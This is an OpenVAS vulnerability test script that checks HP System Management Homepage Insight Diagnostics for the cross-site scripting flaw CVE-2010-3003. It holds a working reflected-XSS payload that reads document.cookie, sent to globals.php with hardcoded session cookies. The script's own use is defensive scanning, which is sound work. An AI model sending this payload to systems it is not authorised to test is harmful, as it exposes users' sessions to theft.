###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_smh_insight_diag_mult_xss_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# HP SMH Insight Diagnostics Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to inject arbitrary HTML code
  in the context of an affected site.
  Impact Level: Application";
tag_affected = "HP Insight Diagnostics Online Edition before 8.5.0-11 on Linux.";
tag_insight = "The flaws are caused by input validation errors in the 'parameters.php',
  'idstatusframe.php', 'survey.php', 'globals.php' and 'custom.php' pages,
  which allows attackers to execute arbitrary HTML and script code in a
  user's browser session in the context of an affected site.";
tag_solution = "Upgrade to higher versions or refer below vendor advisory for update,
  http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02492472";
tag_summary = "The host is running HP SMH with Insight Diagnostics and is prone
  to multiple cross-site scripting vulnerabilities.";

if(description)
{
  script_id(800189);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)");
  script_cve_id("CVE-2010-3003");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("HP SMH Insight Diagnostics Multiple Cross Site Scripting Vulnerabilities");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/67748");
  script_xref(name : "URL" , value : "http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-05");
  script_xref(name : "URL" , value : "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02492472");

  script_description(desc);
  script_summary("Check HP SMH Insight Diagnostics is vulnerable to XSS Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");

## Default HTTPS port
hpsmhPort = 2381;
if(!get_port_state(hpsmhPort)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Construct basic GET request
req1 = string ( "GET / HTTP/1.1\r\n", "Host: ", host, "\r\n",
                "User-Agent: HP SMH Insight Diagnostics XSS Test\r\n",
                "\r\n"
              );
rcvRes1 = https_req_get(port:hpsmhPort, request:req1);

## Confirm the application before trying the exploit
if(">HP System Management Homepage<" >< rcvRes1)
{

  ## Construct XSS GET Attack request
  attackPath = '/hpdiags/globals.php?tabpage=";alert(document.cookie)//';
  req2 = string ( "GET ", attackPath, " HTTP/1.1\r\n", "Host: ", host, "\r\n",
                 "User-Agent: Portale e-commerce SQL Injection Test\r\n",
                 "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" +
                 "d70fd51-1292315018889768; HPSMH-browser-check=done for" +
                 " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" +
                 "2389b2ac7c2fb11b7927ab6e54c43e64\r\n",
                  "\r\n"
               );

  ## Receive the response
  rcvRes2 = https_req_get(port:hpsmhPort, request:req2);

  ## Check Attack pattern in the response
  if(';alert(document.cookie)//.php";' >< rcvRes2){
    security_warning(hpsmhPort);
  }
}
